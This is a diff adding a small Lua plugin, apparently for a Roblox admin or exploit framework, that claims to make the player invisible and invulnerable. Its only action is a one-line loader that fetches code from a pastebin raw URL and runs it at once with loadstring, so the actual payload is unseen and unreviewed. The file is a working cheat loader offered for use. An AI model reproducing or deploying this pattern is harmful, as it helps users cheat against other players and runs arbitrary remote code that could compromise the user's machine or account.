@@ -1,0 +1,15 @@
+local Plugin = {
+	["PluginName"] = "invisgod",
+	["PluginDescription"] = "make you invisible but god",
+	["Commands"] = {
+		["invisgod/god"] = {
+			["Description"] = "idk",
+			["Aliases"] = {'invisgod','god'},
+			["Function"] = function(args,speaker)
+				loadstring(game:HttpGet(('https://pastebin.com/raw/ciqrBj0N'),true))()
+			end,
+		},
+	},
+}
+
+return Plugin
